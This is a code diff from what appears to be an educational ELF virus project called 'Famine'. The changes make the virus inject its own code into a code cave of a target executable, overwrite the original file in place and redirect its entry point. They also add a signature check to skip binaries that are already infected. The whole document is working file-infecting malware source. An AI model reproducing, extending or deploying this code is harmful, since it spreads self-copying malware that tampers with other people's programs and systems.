@@ -16,21 +16,19 @@
 #endif
 
 extern void end();
-extern void real_start();
 void famine(void);
 
 #define JMP_OFFSET 0x6
+#define SIGNATURE_OFFSET 0xa
+#define SIGNATURE_SIZE 25
 #define JMP_SIZE 4
 
-void	_start(void)
+void	__attribute__((naked)) _start(void)
 {
-	__asm__ (".global real_start\n"
-			"real_start:\n"
-			"call famine\n"
+	__asm__ ("call famine\n"
 			"jmp end\n"
 			"signature:\n"
 			".ascii \"Famine coded by Francis\\n\\0\"\n");
-
 }
 
 
@@ -40,12 +38,9 @@ static int	patch_new_file(t_data *data, const char *filename) {
 	char newline[] = "\n";
 	_syscall(SYS_write, 1, newline, 1);
 
+	_syscall(SYS_unlink, filename);
 
-	char woody[] = "woody";
-
-	_syscall(SYS_unlink, woody);
-
-	int fd = _syscall(SYS_open, woody, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
+	int fd = _syscall(SYS_open, filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
 	if (fd == -1)
 		return 1;
 
@@ -72,7 +67,7 @@ static int	calculate_jmp(t_data *data) {
 
 static int	inject(t_data *data) {
 	
-	unsigned long size = (unsigned long)&end - (unsigned long)&real_start;
+	unsigned long size = (unsigned long)&end - (unsigned long)&_start;
 
 	if (bss(data, size) == 1) {
 		return 1;
@@ -80,11 +75,17 @@ static int	inject(t_data *data) {
 
 	calculate_jmp(data);
 
-	ft_memcpy(data->file + data->cave.offset, &real_start, size);
+	ft_memcpy(data->file + data->cave.offset, &_start, size);
 
 	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);
 
 	return 0;
+}
+
+static int	already_patched(t_data data)
+{
+	char	signature[] = "Famine coded by Francis\n";
+	return (ft_memcmp(data.file + (data.elf.ehdr->e_entry + SIGNATURE_OFFSET), signature, SIGNATURE_SIZE));
 }
 
 static int	infect(const char *filename)
@@ -93,13 +94,20 @@ static int	infect(const char *filename)
 	t_data data;
 	ft_memset(&data, 0, sizeof(t_data));
 
-	data.payload_size = (unsigned long)&end - (unsigned long)&real_start;
+	data.payload_size = (unsigned long)&end - (unsigned long)&_start;
 
 	if (map_file(filename, &data) != 0) {
 		return 1;
 	}
 
 	updade_hdr(&data);
+
+	if (!already_patched(data)) {
+		char msg[] = "already infected\n";
+		_syscall(SYS_write, 1, msg, sizeof(msg) - 1);
+		return (free_data(&data), 1);
+	}
+	// check if already infected
 
 	if (inject(&data) != 0) {
 		free_data(&data);
